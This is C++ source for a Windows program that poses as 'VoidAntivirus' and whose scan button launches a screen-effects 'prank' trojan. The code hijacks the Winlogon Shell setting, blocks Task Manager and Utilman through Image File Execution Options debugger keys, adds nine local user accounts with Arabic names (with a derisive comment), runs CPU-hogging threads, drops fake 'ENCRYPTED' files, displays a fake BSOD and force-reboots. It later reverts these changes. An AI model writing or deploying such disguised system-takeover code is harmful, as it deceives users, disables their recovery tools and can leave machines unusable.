#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <string>
#include <vector>
#include <cstdio>
#include <cwchar>
#include <cmath>
#include <cstdlib>
#include <thread>
#include <atomic>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

// ============================================================
// КОНСТАНТЫ И ГЛОБАЛЫ
// ============================================================
HINSTANCE g_hInst = nullptr;
std::atomic<bool> g_stop{false};
std::wstring g_exePath;

const wchar_t* REG_PHASE = L"Software\\VoidAV";
const wchar_t* REG_LOGON = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
const wchar_t* REG_RUNONCE = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
const wchar_t* REG_IFEO = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";

// ============================================================
// УТИЛИТЫ
// ============================================================
void PumpMessages() {
    MSG m; while (PeekMessageW(&m, nullptr, 0, 0, PM_REMOVE)) { TranslateMessage(&m); DispatchMessageW(&m); }
}
void SleepPump(int ms) {
    DWORD s = GetTickCount();
    while ((int)(GetTickCount() - s) < ms && !g_stop.load()) { PumpMessages(); Sleep(10); }
}
void SetRegStr(HKEY root, const wchar_t* sub, const wchar_t* val, const wchar_t* data) {
    HKEY h;
    if (RegCreateKeyExW(root, sub, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val, 0, REG_SZ, (const BYTE*)data, (DWORD)((wcslen(data)+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}
void SetRegInt(HKEY root, const wchar_t* sub, const wchar_t* val, DWORD data) {
    HKEY h;
    if (RegCreateKeyExW(root, sub, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val, 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
        RegCloseKey(h);
    }
}
int GetPhase() {
    HKEY h; DWORD val = 0, sz = sizeof(val);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_PHASE, 0, KEY_READ, &h) == ERROR_SUCCESS) {
        RegQueryValueExW(h, L"Phase", nullptr, nullptr, (LPBYTE)&val, &sz);
        RegCloseKey(h);
    }
    return val;
}
void SetPhase(int p) { SetRegInt(HKEY_CURRENT_USER, REG_PHASE, L"Phase", p); }

void RunCommand(const wchar_t* cmd, bool wait = false) {
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(nullptr, (LPWSTR)cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        if (wait) WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

// ============================================================
// МОДАЛЬНОЕ ОКНО АНТИВИРУСА
// ============================================================
void ShowAVWindow(HWND parent, const wchar_t* title, const wchar_t* text, bool error = false) {
    MessageBoxW(parent, text, title, MB_OK | (error ? MB_ICONERROR : MB_ICONINFORMATION) | MB_TOPMOST);
}

// ============================================================
// GDI ЭФФЕКТЫ (ДЛЯ VOID.EXE)
// ============================================================
void FaintEyesThread() {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);

    DWORD start = GetTickCount();
    while (!g_stop.load() && (int)(GetTickCount() - start) < 19000) {
        // Заливаем черным
        RECT r = {0, 0, sw, sh};
        HBRUSH black = CreateSolidBrush(RGB(0,0,0));
        FillRect(hMem, &r, black);
        DeleteObject(black);

        // Рисуем "глаза" (едва заметные синие круги)
        HBRUSH eye = CreateSolidBrush(RGB(10, 20, 50));
        int cx = sw/2, cy = sh/2;
        Ellipse(hMem, cx - 100, cy - 40, cx - 20, cy + 40);
        Ellipse(hMem, cx + 20, cy - 40, cx + 100, cy + 40);
        DeleteObject(eye);

        BitBlt(hScreen, 0, 0, sw, sh, hMem, 0, 0, SRCCOPY);
        Sleep(100);
    }
    SelectObject(hMem, old); DeleteObject(bmp); DeleteDC(hMem); ReleaseDC(nullptr, hScreen);
}

void BlueTintThread() {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
    HDC hBlue = CreateCompatibleDC(hScreen);
    HBITMAP bBlue = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP oldB = (HBITMAP)SelectObject(hBlue, bBlue);
    HBRUSH b = CreateSolidBrush(RGB(0, 50, 150));
    RECT r = {0, 0, sw, sh}; FillRect(hBlue, &r, b); DeleteObject(b);

    DWORD start = GetTickCount();
    while (!g_stop.load() && (int)(GetTickCount() - start) < 15000) {
        BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);
        BLENDFUNCTION bf = { AC_SRC_OVER, 0, 40, 0 };
        AlphaBlend(hMem, 0, 0, sw, sh, hBlue, 0, 0, sw, sh, bf);
        BitBlt(hScreen, 0, 0, sw, sh, hMem, 0, 0, SRCCOPY);
        Sleep(50);
    }
    SelectObject(hMem, old); DeleteObject(bmp); DeleteDC(hMem);
    SelectObject(hBlue, oldB); DeleteObject(bBlue); DeleteDC(hBlue);
    ReleaseDC(nullptr, hScreen);
}

void GdiDropThread(int durationMs) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP bmp = CreateCompatibleBitmap(hScreen, sw, sh);
    HBITMAP old = (HBITMAP)SelectObject(hMem, bmp);
    BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);

    DWORD start = GetTickCount();
    while (!g_stop.load() && (int)(GetTickCount() - start) < durationMs) {
        int shift = (int)(GetTickCount() - start) / 10; // Плывет вниз
        BitBlt(hScreen, 0, shift, sw, sh - shift, hMem, 0, 0, SRCCOPY);
        Sleep(15);
    }
    SelectObject(hMem, old); DeleteObject(bmp); DeleteDC(hMem); ReleaseDC(nullptr, hScreen);
}

// ============================================================
// МУЗЫКА
// ============================================================
void PlayVoidMusic() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    *wcsrchr(path, L'\\') = 0;
    wcscat_s(path, L"\\void-music.mp3");
    if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
        PlaySoundW(path, nullptr, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
    } else {
        // Fallback — Bytebeat (грустная мелодия)
        Beep(300, 500); Beep(250, 500); Beep(200, 1000);
    }
}

// ============================================================
// ФЕЙКОВЫЕ ПРОЦЕССЫ (Paylods)
// ============================================================
void SpawnFakeProcesses() {
    // 1. eddge.exe (Открывает браузер)
    std::thread([](){
        for(int i=0; i<3; ++i) {
            ShellExecuteW(nullptr, L"open", L"https://www.google.com/search?q=how+to+download+a+trojan", nullptr, nullptr, SW_SHOW);
            Sleep(5000);
        }
    }).detach();

    // 2. OneDive.exe (Создает файлы)
    std::thread([](){
        wchar_t desktop[MAX_PATH], pub[MAX_PATH];
        SHGetFolderPathW(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desktop);
        SHGetFolderPathW(nullptr, CSIDL_COMMON_DOCUMENTS, nullptr, 0, pub);
        for(int i=0; i<5; ++i) {
            wchar_t dir[MAX_PATH];
            swprintf_s(dir, L"%s\\SYSTEM_BACKUP_%d", desktop, i);
            CreateDirectoryW(dir, nullptr);
            wchar_t file[MAX_PATH]; swprintf_s(file, L"%s\\ENCRYPTED.txt", dir);
            HANDLE h = CreateFileW(file, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if(h != INVALID_HANDLE_VALUE) CloseHandle(h);
            Sleep(1000);
        }
    }).detach();

    // 3. deskoop.exe (Грузит CPU)
    for(int i=0; i<4; ++i) {
        std::thread([](){
            while(true) { volatile int x = 0; for(int j=0; j<1000000; ++j) x++; Sleep(1); }
        }).detach();
    }
}

// ============================================================
// VOID.EXE (Замена Explorer)
// ============================================================
LRESULT CALLBACK VoidProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH b = CreateSolidBrush(RGB(0,0,0));
        FillRect(dc, &rc, b); DeleteObject(b);
        EndPaint(h, &ps); return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// Окно-ошибка, следующее за курсором
void FollowErrorThread() {
    Sleep(10000); // 10 сек
    for(int i=0; i<15 && !g_stop.load(); ++i) {
        // Симулируем "ошибку" которая следует за курсором
        POINT p; GetCursorPos(&p);
        MessageBoxW(nullptr, L"Пустовато, однако, не правда ли?", L"Void Error", MB_OK | MB_ICONERROR | MB_TOPMOST);
    }
}

// Окна с арабским текстом
void ArabicErrorsThread() {
    Sleep(25000); // 25 сек
    const wchar_t* arabic[] = { L"لا يمكنك إغلاق هذا", L"أنت عالق", L"النظام ميت", L"مرحبا بك في الفراغ" };
    for(int i=0; i<19 && !g_stop.load(); ++i) {
        MessageBoxW(nullptr, arabic[i%4], L"Void", MB_OK | MB_ICONWARNING | MB_TOPMOST);
        Sleep(500);
    }
}

// CMD симуляция
void CmdSimThread() {
    Sleep(10000);
    RunCommand(L"cmd.exe /c echo Deleting C:\\Windows\\System32\\winlogon.exe... && ping 127.0.0.1 -n 5 > nul");
}

int RunVoid() {
    // Настройка окна
    WNDCLASSW wc = {}; wc.hInstance = g_hInst; wc.lpfnWndProc = VoidProc;
    wc.lpszClassName = L"VoidWnd"; wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClassW(&wc);
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"VoidWnd", L"Void", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(hwnd, SW_SHOW);

    PlayVoidMusic();

    std::thread tEyes(FaintEyesThread);
    std::thread tFollow(FollowErrorThread);
    std::thread tCmd(CmdSimThread);
    std::thread tBlue(BlueTintThread);
    
    SleepPump(25000); // Ждем 25 секунд (пока идет матрица/глаза/синий фон)

    // Фаза 25-53 сек: GDI эффекты + Запуск Explorer + Арабские ошибки
    RunCommand(L"explorer.exe"); // Возвращаем проводник (чтобы смешать с ошибками)
    std::thread tArabic(ArabicErrorsThread);
    
    // Простые GDI эффекты (инверсия)
    HDC hScreen = GetDC(nullptr);
    DWORD start = GetTickCount();
    while(!g_stop.load() && (int)(GetTickCount() - start) < 28000) {
        if(rand() % 10 == 0) BitBlt(hScreen, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hScreen, 0, 0, NOTSRCCOPY);
        Sleep(100);
    }
    ReleaseDC(nullptr, hScreen);

    // Финал (53 сек): Убиваем всё, тишина 5 сек
    PlaySoundW(nullptr, nullptr, 0);
    RunCommand(L"taskkill /f /im explorer.exe");
    g_stop = true;
    if(tEyes.joinable()) tEyes.join();
    if(tFollow.joinable()) tFollow.join();
    if(tCmd.joinable()) tCmd.join();
    if(tBlue.joinable()) tBlue.join();
    if(tArabic.joinable()) tArabic.join();
    
    DestroyWindow(hwnd);
    Sleep(5000); // Тишина

    // Восстанавливаем систему
    SetRegStr(HKEY_LOCAL_MACHINE, REG_LOGON, L"Shell", L"explorer.exe");
    SetRegStr(HKEY_LOCAL_MACHINE, REG_LOGON, L"Userinit", L"C:\\Windows\\system32\\userinit.exe,");
    SetPhase(5); // Переход в Boot Phase
    SetRegStr(HKEY_CURRENT_USER, REG_RUNONCE, L"VoidBoot", g_exePath.c_str());
    
    // Ребут
    HANDLE t; TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t);
    LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(t, FALSE, &tp, 0, nullptr, nullptr); CloseHandle(t);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
    return 0;
}

// ============================================================
// BOOT PHASE (То, что происходит при загрузке)
// ============================================================
int RunBootPhase() {
    Sleep(2000); // Ждем инициализации системы
    
    // Маленькое окошко
    MessageBoxW(nullptr, L"Это конец, бро.", L"Void", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    
    // Плывущий вниз экран
    std::thread tDrop(GdiDropThread, 10000);
    SleepPump(10000);
    tDrop.join();

    // Вызов cmd
    RunCommand(L"cmd.exe /c echo SYSTEM_FAILURE && ping 127.0.0.1 -n 3 > nul");
    Sleep(3000);
    
    // Синий BSOD (Фейковый, чтобы не убить систему насовсем)
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HDC h = GetDC(nullptr);
    HBRUSH b = CreateSolidBrush(RGB(0, 120, 215));
    RECT r = {0,0,sw,sh}; FillRect(h, &r, b); DeleteObject(b);
    SetBkMode(h, TRANSPARENT); SetTextColor(h, RGB(255,255,255));
    HFONT f = CreateFontW(60,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
    HFONT old = (HFONT)SelectObject(h, f);
    DrawTextW(h, L":( \n\nВаш компьютер был уничтожен. \n\nVoidAV_SYSTEM_KILLED", -1, &r, DT_CENTER | DT_VCENTER | DT_WORDBREAK);
    SelectObject(h, old); DeleteObject(f);
    Sleep(6000);

    // ВОССТАНОВЛЕНИЕ
    // Удаляем 9 аккаунтов
    const wchar_t* users[] = { L"أحمد", L"محمد", L"علي", L"عمر", L"خالد", L"يوسف", L"إبراهيم", L"سعيد", L"حسن" };
    for(auto u : users) {
        wchar_t cmd[128]; swprintf_s(cmd, L"cmd.exe /c net user \"%s\" /delete", u);
        RunCommand(cmd, true);
    }
    // Удаляем блокировки
    RunCommand(L"cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /f");
    RunCommand(L"cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\" /f");
    RunCommand(L"cmd.exe /c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f");
    
    // Убираем RunOnce
    HKEY hk; RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUNONCE, 0, KEY_SET_VALUE, &hk);
    RegDeleteValueW(hk, L"VoidBoot");
    RegCloseKey(hk);

    SetPhase(0); // Сброс
    MessageBoxW(nullptr, L"Восстановление завершено. Это был пранк.", L"VoidAV", MB_OK | MB_ICONINFORMATION);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
    return 0;
}

// ============================================================
// ГЛАВНОЕ ОКНО АНТИВИРУСА (Вкладки)
// ============================================================
LRESULT CALLBACK AVProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int activeTab = 0;
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        // Темный фон
        HBRUSH bg = CreateSolidBrush(RGB(20,20,20));
        FillRect(dc, &rc, bg); DeleteObject(bg);

        // Заголовок
        SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255,255,255));
        HFONT f = CreateFontW(24,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
        HFONT old = (HFONT)SelectObject(dc, f);
        TextOutW(dc, 20, 20, L"VoidAntivirus", 13);
        
        // Вкладки
        SelectObject(dc, f); // Используем маленький шрифт для вкладок
        HFONT fTab = CreateFontW(16,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
        SelectObject(dc, fTab);
        TextOutW(dc, 20, 60, L"Главная", 7);
        TextOutW(dc, 120, 60, L"Сканирование", 11);
        TextOutW(dc, 250, 60, L"Настройки", 9);
        
        // Контент (Заглушка)
        SetTextColor(dc, RGB(150,150,150));
        TextOutW(dc, 20, 120, L"Система защищена. Обновлений не требуется.", 41);

        // Кнопки
        if (activeTab == 0) {
            // Быстрое сканирование
            RECT btn1 = {20, 200, 200, 240};
            HBRUSH b1 = CreateSolidBrush(RGB(0, 150, 200));
            FillRect(dc, &btn1, b1); DeleteObject(b1);
            SetTextColor(dc, RGB(255,255,255));
            DrawTextW(dc, L"Быстрое сканирование", -1, &btn1, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

            // Полное сканирование (ЗАПУСК)
            RECT btn2 = {220, 200, 400, 240};
            HBRUSH b2 = CreateSolidBrush(RGB(200, 50, 50));
            FillRect(dc, &btn2, b2); DeleteObject(b2);
            DrawTextW(dc, L"Полное сканирование", -1, &btn2, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }

        SelectObject(dc, old); DeleteObject(f); DeleteObject(fTab);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_LBUTTONDOWN) {
        int x = LOWORD(l), y = HIWORD(l);
        // Вкладки
        if (y > 50 && y < 80) {
            if (x > 20 && x < 110) activeTab = 0;
            if (x > 120 && x < 230) activeTab = 1;
            if (x > 250 && x < 330) activeTab = 2;
            InvalidateRect(h, nullptr, TRUE);
            return 0;
        }
        // Кнопка "Полное сканирование"
        if (activeTab == 0 && x > 220 && x < 400 && y > 200 && y < 240) {
            ShowAVWindow(h, L"Сканирование", L"Запуск полного сканирования...");
            Sleep(3000);
            ShowAVWindow(h, L"Угроза!", L"Найдены вирусы в C:\\Windows\\System32:\n\neddge.exe\nOneDive.exe\ndeskoop.exe\n\nУдалить?", true);
            
            // Запускаем вирусы
            SpawnFakeProcesses();
            
            // GDI мигание + грустная музыка (7 сек)
            for(int i=0; i<14; ++i) {
                HDC hScreen = GetDC(nullptr);
                BitBlt(hScreen, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hScreen, 0, 0, NOTSRCCOPY);
                ReleaseDC(nullptr, hScreen);
                Beep(300 - i*10, 500);
                Sleep(500);
            }

            // Настройка Void.exe
            SetRegStr(HKEY_LOCAL_MACHINE, REG_LOGON, L"Shell", g_exePath.c_str()); // Заменяем explorer
            SetRegStr(HKEY_LOCAL_MACHINE, REG_LOGON, L"Userinit", L"C:\\Windows\\system32\\userinit.exe,");
            // IFEO
            SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe", L"Debugger", L"cmd.exe /c echo Access Denied & pause");
            SetRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe", L"Debugger", L"cmd.exe /c echo Access Denied & pause");
            
            // Создаем арабов
            const wchar_t* users[] = { L"أحمد", L"محمد", L"علي", L"عمر", L"خالد", L"يوسف", L"إبراهيم", L"سعيد", L"حسن" };
            for(auto u : users) {
                wchar_t cmd[128]; swprintf_s(cmd, L"cmd.exe /c net user \"%s\" /add", u);
                RunCommand(cmd, true);
            }

            // Ребут
            SetPhase(1);
            HANDLE t; TOKEN_PRIVILEGES tp;
            OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t);
            LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
            tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(t, FALSE, &tp, 0, nullptr, nullptr); CloseHandle(t);
            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
        }
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
    g_hInst = hInst;
    wchar_t path[MAX_PATH]; GetModuleFileNameW(nullptr, path, MAX_PATH);
    g_exePath = path;

    int phase = GetPhase();
    if (phase == 1) {
        // Этот запуск — Void.exe (вызван из Winlogon\Shell)
        return RunVoid();
    } else if (phase == 5) {
        // Этот запуск — Boot Phase (вызван из RunOnce)
        return RunBootPhase();
    }

    // Обычный запуск — Антивирус
    WNDCLASSW wc = {};
    wc.hInstance = hInst; wc.lpfnWndProc = AVProc; wc.lpszClassName = L"VoidAVUI";
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(0, L"VoidAVUI", L"VoidAntivirus", WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 600, 400, nullptr, nullptr, hInst, nullptr);
    ShowWindow(hwnd, SW_SHOW); UpdateWindow(hwnd);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    return 0;
}
